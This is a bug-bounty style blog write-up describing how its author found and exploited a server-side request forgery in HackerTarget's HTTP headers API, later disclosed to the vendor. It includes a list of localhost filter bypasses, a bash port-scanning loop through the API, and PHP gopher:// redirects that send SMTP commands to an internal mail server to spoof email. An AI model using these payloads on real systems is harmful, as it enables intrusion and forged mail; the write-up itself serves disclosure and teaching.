---
layout: post
title: "Hacking the Hackers: Leveraging an SSRF in HackerTarget"
author: Corben Leo
---
### &#128187;&nbsp;Introduction:
This is a write-up of an SSRF I accidentally found in HackerTarget and leveraged to get access to internal services! Please **note** that they **don't** have an active bug bounty program.<br>
<h4>&#129300; What is HackerTarget?</h4>
<a href="https://hackertarget.com" class="link">HackerTarget</a> is a service that provides access to online vulnerability scanners and tools used by many security professionals and "makes securing your systems easier". They also are the creators of <a href="https://dnsdumpster.com/" class="link">DNSDumpster</a>, which is utilized in several recon tools.
<br><br>
<h4>&#128565; SSRF:</h4>
Server-Side Request Forgery (SSRF) is a vulnerability in which an attacker can send a controlled, crafted request via a vulnerable application. We can communicate with different services running on different protocols by utilizing URI schemes such as `gopher://`,`dict://`, `ftp://`, etc. Getting a server to issue a request **is not** a vulnerability in itself, but it 
 becomes one when you can make requests to things you wouldn’t or shouldn’t normally have access to, such as internal networks or internal services.<br><br>
### &#128270;&nbsp;Finding the vulnerability:
I was using DNSDumpster for recon during a bug hunting session, and I noticed there was a button of a globe similar to &#127758; that said "Get HTTP Headers":
<br>
<br>
![HT-HTTPHeaders](/images/ht-httpheaders.png "HTTP Headers function")
<br><br>
It made a call to `https://api.hackertarget.com/httpheaders/?q=<target>` and displayed the HTTP Headers of a simple **GET** request sent to the target server.
<br><br>
![HT-API-Call](/images/api-result.png "HackerTarget")
<br><br>I was obviously intrigued, so I tried querying 127.0.0.1! The API dumped the HTTP request and the query went through! I then tried to see if I could get the SSH version by querying **127.0.0.1:22**
<br><br>Response:<br><br>
![HT-SSH](/images/ht-ssh.png "HackerTarget")
<br><br>
I initially reported it as is, knowing I could hit internal services if there were any. They thanked me for the heads up and told me to check the patch they issued. I checked it, and it was easy to bypass: it was merely blocking 127.0.0.1. Here are a few of the bypasses I used:
```
0
127.00.1
127.0.01
0.00.0
0.0.00
127.1.0.1
127.10.1
127.1.01
0177.1
0177.0001.0001
0x0.0x0.0x0.0x0
0000.0000.0000.0000
0x7f.0x0.0x0.0x1
0177.0000.0000.0001
0177.0001.0000..0001
0x7f.0x1.0x0.0x1
0x7f.0x1.0x1
localtest.me
```
I informed them that there **isn't** a way to validate the query just by using string-based checks, so I suggested that they **resolve** the domains and **check** them against local IP ranges. They agreed and said they would think about it.
<br><br>
About 10 days later I asked if they had issued another patch or not, and the response was:
> "It is on my todo list. Not critical though as there are no local services that could be hit with it."

<center>
<h4>&#128527;&nbsp;challenge accepted.</h4>
</center>
<br>

### &#128526;&nbsp;Leveraging like a Boss
I decided to write a bash script that queried the API with one of the bypasses and with a port number to see if I could see what internal services it was running:
```bash
#!/usr/bin/env bash
for port in `seq 1 9999`
do
	echo -e "\n\n[+] Checking Port: "$port"\n"
	curl 'https://api.hackertarget.com/httpheaders/?q=http://'$1':'$port && echo -e "\n"
done
```
I ran it: `âžœ root@pwn  ~  ./ht 0177.1`

HackerTarget limits 25 API queries per IP, so my script only showed the ports 1 - 25. The only responses I got were from SSH running on port 22 and I luckily got a response from the SMTP server on port 25, which I had totally overlooked before!<br><br>
![HT-POSTFIX](/images/ht-postfix.png "HackerTarget")
<br>
#### &#128104;&zwj;&#128187; &nbsp;SMTP?
 - SMTP stands for <font id="highlighter">Simple Mail Transfer Protocol</font>.
 - It is a <a href="https://en.wikipedia.org/wiki/Internet_protocol_suite" rel="noopener noreferrer" target="_blank"><font id="highlighter">TCP/IP</font></a> protocol that's used for sending emails. (who would've guessed? &#128514;)
 - Usually it's used along with either <a target="_blank" rel="noopener noreferrer" href="https://en.wikipedia.org/wiki/Post_Office_Protocol"><font id="highlighter">pop3</font></a> or<a target="_blank" rel="noopener noreferrer" href="https://en.wikipedia.org/wiki/Internet_Message_Access_Protocol"> <font id="highlighter">imap</font></a>, which are used to receive emails.


I knew I would be able to hit the service with this SSRF, but I wasn't positive that I would be able to send the valid commands needed to send emails from it. I then tried deducing which wrappers were supported and enabled besides **http://** and **https://**. <br><br>
I tried using <font id="highlighter2">dict://</font> right away and was able to get the libcurl version, but that wasn't very helpful. Next, I created a PHP file on my server to initiate a redirect to another port with the <font id="highlighter2">gopher://</font> wrapper:<br>
```php
<?php
header("Location: gopher://<server>:1337/_SSRF%0ATest!");
?>
```
<br>
In a nutshell, the gopher:// protocol sends 1 character, a new line (CR+LF), and the remaining data, which allows us to send a **multiline request**. <br><br>
I started netcat and checked the API again: `https://api.hackertarget.com/httpheaders/?q=http://<server>/redirect.php`. It followed the redirect  and I received a multiline request on port 1337!
<br><br>This means I could send valid commands to the internal SMTP server!

### &#127881;&nbsp;The Finale
I created another PHP file on my server that would redirect the API to the internal SMTP server and issue the valid SMTP commands!
```php
<?php
        $commands = array(
                'HELO hackertarget.com',
                'MAIL FROM: <admin@hackertarget.com>',
                'RCPT To: <C0RB3N@oou.us>',
                'DATA',
                'Subject: @C0RB3N!',
                'Corben was here, woot woot!',
                '.'
        );

        $payload = implode('%0A', $commands);

        header('Location: gopher://0:25/_'.$payload);
?>
```
<br><br>
I changed the query one last time: `https://api.hackertarget.com/httpheaders/?q=http://<server>/smtp.php`
<br><br>
I went to my email, reloaded it once.
<br><br>
A new email popped up from "<font id="highlighter">admin@hackertarget.com</font>" with the subject "<font id="highlighter">@C0RB3N</font>" and the message was "<font id="highlighter2">Corben was here, woot woot!</font>"
<br><br>
After yelling 'heck yeah!', I created a quick proof-of-concept video and I sent it over to HackerTarget.
<br> <br>Here's the video <font color="#2EB03D">&#128373;&#65039;</font><br>
<iframe width="580" height="370" src="https://www.youtube.com/embed/F_sC_OrSkIc" frameborder="0" gesture="media" allow="encrypted-media" allowfullscreen></iframe>
<br><br>The response?
> Nice work. Thanks for the PoC. I will finish mitigation on this and check other inputs too now.... you have opened my eyes to SSRF :)


<br><br>
It was a blast to leverage an SSRF on a target that everyone knows of and uses often!<br><br>

### &#9888;&#65039;&nbsp;Note:
They **DO NOT** have a bug bounty program, so please **DO NOT** test them without their permission!
<br><br>
Thanks for reading,<br><br>
**Corben Leo**
- <a class="link" href="https://twitter.com/hacker_"  target="_blank" rel="noopener noreferrer">https://twitter.com/hacker_</a>
- <a class="link" href="https://hackerone.com/cdl" target="_blank" rel="noopener noreferrer">https://hackerone.com/cdl</a>
- <a class="link" href="https://bugcrowd.com/c" target="_blank" rel="noopener noreferrer">https://bugcrowd.com/c</a>
- <a class="link" href="https://github.com/lc"  target="_blank" rel="noopener noreferrer">https://github.com/lc</a>
